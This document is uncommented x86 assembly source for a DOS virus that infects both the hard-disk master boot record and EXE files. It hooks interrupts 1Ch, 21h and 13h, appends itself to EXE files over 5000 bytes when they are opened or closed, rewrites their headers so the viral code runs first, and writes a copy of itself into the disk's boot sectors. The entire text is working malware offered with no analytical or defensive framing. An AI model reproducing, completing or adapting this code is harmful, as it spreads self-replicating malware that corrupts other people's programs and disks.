
	cut	equ	offset len-300h
	virsize equ	offset len-100h
	memsize equ	(virsize+20h)/16+1

                xor     di,di
                mov     ds,di
                mov     ss,di
                mov     sp,7BF0h
                mov     si,7C00h
                push    si
                mov     ax,3000h
                mov     es,ax
                mov     cx,201h
                push    cx
                push    cx
        rep     movsw
                pop     ax
                push    cx
                mov     cl,8
                mov     bx,cut
                mov     dx,80h
                int     13h
                mov     [1Ch*4],offset timer-100h
                mov     [1Ch*4+2],3000h
                pop     es
                inc     cx
                pop     ax
                pop     bx
                db      0EAh
                dw      offset jump-100h
                dw      3000h

        jump    db      0CDh,013h,0EAh,00,07Ch,00,00

        timer:  push    ax
                push    ds
                xor     ax,ax
                mov     ds,ax
                cmp     [84h],ax
                jz      tmexit
                mov     ax,[10h]                ; int 04h
                mov     [70h],ax                ; int 1Ch
                mov     ax,[12h]
                mov     [72h],ax
                mov     ax,[84h]
                mov     cs:old-100h,ax
                mov     ax,[86h]
                mov     cs:old+2-100h,ax
                mov     [84h],offset int21-100h
                mov     [86h],cs
		mov	ax,[2Fh*4]
		mov	cs:int2F-100h,ax
		mov	ax,[2Fh*4+2]
		mov	cs:int2F+2-100h,ax
        tmexit: pop     ds
                pop     ax
                iret

        int21:  cmp     ax,4B00h
                jne     exit21
                push    ax
                push    bx
                push    cx
                push    dx
                push    ds
                push    es
                push    si
                push    di
                mov     ah,52h
                int     21h
                xor     si,si
                xor     di,di
                mov     ds,es:[bx-2]
                mov     bx,ds
                mov     ax,[di+3]
                add     [di+3],memsize
                inc     bx
                add     ax,bx
                mov     es,ax
                push    ax
                mov     ax,es:[di+3]
                sub     ax,memsize
                push    ax
                mov     ax,[di+3]
                add     ax,bx
                mov     ds,ax
                mov     byte ptr [di],5Ah
                mov     word ptr [di+1],di
                pop     [di+3]
                pop     es
                push    cs
                pop     ds
                mov     cx,virsize/2+1
        rep     movsw
                mov     ds,cx
                mov     [84h],offset res21-100h
                mov     [86h],es
        back:   pop     di
                pop     si
                pop     es
                pop     ds
                pop     dx
                pop     cx
                pop     bx
                pop     ax
        exit21: db      0EAh
        old     dw      ?
                dw      ?

        res21:  push    ax
                push    bx
                push    cx
                push    dx
                push    ds
                push    es
                push    si
                push    di
                cmp     ah,3Eh
                je      close
                cmp     ah,3Dh
                jne     back

        open:   call    driver
		xchg	ax,bx
		jc	out
                call    chexe
                jne     out
                mov     cs:len-100h,cx
        out:    mov     ah,3Eh
                call    driver
                jmp     back

        close:  call    chexe
                jne     back
                cmp     cx,cs:len-100h
                je      back
		cmp	cx,5000
		jb	back
                push    cx
                push    dx
                push    cs
                pop     es
                push    cs
                pop     ds
                mov     ah,3Fh
                mov     dx,offset buf-100h
                mov     cx,20h
                call    driver
                mov     si,offset buf+0Eh-100h
                mov     di,offset save-100h
                movsw
                movsw
                lodsw
                movsw
                movsw
                pop     dx
                pop     ax
                mov     cl,16
                div     cx
                inc     ax
                push    ax
                push    ax
                mul     cx
                mov     cx,ax
                xchg    cx,dx
                mov     ax,4200h
                call    driver
                pop     ax
                sub     ax,[si-10h]
                mov     [si-2],ax
                mov     [si-0Ah],ax
                mov     [si-8],500h
                mov     [si-4],offset go-100h
                pop     ax
                xor     dx,dx
                mov     cx,20h
		push	cx
                div     cx
		inc	ax
		inc	ax
                mov     [si-14h],ax
                mov     [si-16h],dx
                mov     ah,40h
                mov     cx,virsize
                xor     dx,dx
                call    driver
                call    chexe
                mov     ah,40h
		pop	cx
                mov     dx,offset buf-100h
                call    driver
                jmp     back

        go:     mov     bx,es
                add     bx,10h
                add     cs:save+6-100h,bx
                add     bx,cs:save-100h
                push    bx
		push	ds
		push	es

		call	cell
		test	si,si
		je	exec
		cmp	word ptr [si+2],0A000h
		jb	exec
		mov	ah,2
		push	cs
		pop	es
		push	cs
		pop	ds
		mov	bx,offset buf-100h
		mov	cl,1
		call	doit
		xor	si,si
		mov	di,bx
		mov	cl,cut/2
	rep	cmpsw
		je	exec
		inc	count-100h
		mov	ah,3
		mov	cl,9
		call	doit
		xor	si,si
		mov	di,bx
		mov	cl,cut/2+1
	rep	movsw
		mov	ah,3
		inc	cx
		call	doit
		mov	bx,cut
		mov	cl,8
		mov	ah,3
		call	doit

	exec:	pop	es
		pop	ds
		pop	ss
                mov     sp,cs:save+2-100h
                jmp     dword ptr cs:save+4-100h

        chexe:  push    bx
                mov     ax,1220h
		call	dosint
                mov     bl,es:[di]
                mov     ax,1216h
		call	dosint
                pop     bx
                add     di,15h
                xor     ax,ax
                stosw
                stosw
                mov     cx,es:[di-8]
                mov     dx,es:[di-6]
                add     di,0Fh
                mov     ax,'XE'
                scasw
                jne     notexe
                scasb
                clc
        notexe: ret

	cell:	push	ax
		push	bx
		push	cx
		mov	ah,30h
                int     21h
		xor	si,si
                xchg    ah,al
		cmp	ax,401h
		ja	newdos
		cmp	ax,314h
		jb	newdos
                cmp     ax,31Eh
                mov     si,7B4h
                jae     newdos
                mov     si,10A5h
                cmp     al,10
                je      newdos
		mov	si,1EC9h
        newdos: mov     ds,cx
		pop	cx
		pop	bx
		pop	ax
                ret

        driver: pushf
                call    dword ptr cs:old-100h
                ret

	doit:	push	ds
		call	cell
		mov	ch,0
		mov	al,1
		mov	dx,80h
		pushf
		call	dword ptr [si]
		pop	ds
		ret

	dosint: pushf
		db	9Ah
	int2F	dw	?
		dw	?
		ret

	count	dw	0
        save    dw      4 dup (?)
        len     label   word
        buf     label   word
